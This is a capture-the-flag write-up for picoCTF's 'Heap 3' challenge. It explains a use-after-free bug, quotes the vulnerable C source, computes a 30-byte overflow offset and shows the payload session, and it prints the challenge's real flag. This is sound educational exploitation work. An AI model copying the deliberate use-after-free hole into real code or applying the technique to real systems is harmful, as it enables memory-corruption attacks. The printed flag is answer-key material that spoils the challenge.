# Writeup: Heap 3

## Introduction

The vulnerability that we will be taking advantage of today is the use after free vulnerability. The use after free vulnerability allows us to take advantage of a dangling pointer by allocating a new segment of memory that is the same size as the freed memory that way we are able to write to the memory that the freed pointer still points to. The reason we are able to do this is because malloc reuses freed chunks of memory of matching size. In this case this will allow us to overwrite the fields in the x struct particularly the flag field so that we can obtain the flag. Below are the lines of code that contain the win condition and the struct variable:

```
    // Create struct
    typedef struct {
    char a[10];
    char b[10];
    char c[10];
    char flag[5];
    } object;

    int num_allocs;
    object *x;

    void check_win() {
        if(!strcmp(x->flag, "pico")) {
            printf("YOU WIN!!11!!\n");

            // Print flag
            char buf[FLAGSIZE_MAX];
            FILE *fd = fopen("flag.txt", "r");
            fgets(buf, FLAGSIZE_MAX, fd);
            printf("%s\n", buf);
            fflush(stdout);

            exit(0);

        } else {
            printf("No flage for u :(\n");
            fflush(stdout);
        }
        // Call function in struct
    }
```

As you can see there is a 30 byte offset from the beginning of the struct to the flag variable that we need to overwrite, which means we'll need to add 30 characters to the beginning of our payload and then the relevant string to meet the win condition which in this case is "pico" as seen above. Below are the free and scanf functions, both being necessary to exploit the use after free vulnerability:

```
    void alloc_object() {
        printf("Size of object allocation: ");
        fflush(stdout);
        int size = 0;
        scanf("%d", &size);
        char* alloc = malloc(size);
        printf("Data for flag: ");
        fflush(stdout);
        scanf("%s", alloc);
    }

    void free_memory() {
        free(x);
    }
```

## Results


The program gives us 5 options, the relevant options are: Allocate object, print the x flag, check for win, and free. So to recap, first we will free the x variable allowing us to allocate the same block of memory for our alloc variable. Next we will allocate the same memory size which we can calculate by adding up the bytes in the field which is 35. Finally we add the 30 characters to the input we mentioned earlier and then the required string to obtain the flag which is "pico". Below is the result of carrying out the described tasks:

```
    freed but still in use
    now memory untracked
    do you smell the bug?

    1. Print Heap
    2. Allocate object
    3. Print x->flag
    4. Check for win
    5. Free x
    6. Exit

    Enter your choice: 5

    1. Print Heap
    2. Allocate object
    3. Print x->flag
    4. Check for win
    5. Free x
    6. Exit

    Enter your choice: 2
    Size of object allocation: 35
    Data for flag: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico

    1. Print Heap
    2. Allocate object
    3. Print x->flag
    4. Check for win
    5. Free x
    6. Exit

    Enter your choice: 3


    x = pico


    1. Print Heap
    2. Allocate object
    3. Print x->flag
    4. Check for win
    5. Free x
    6. Exit

    Enter your choice: 4
    YOU WIN!!11!!
    picoCTF{now_thats_free_real_estate_f8fb9f96}
```
Finally, we have the flag as shown above. 
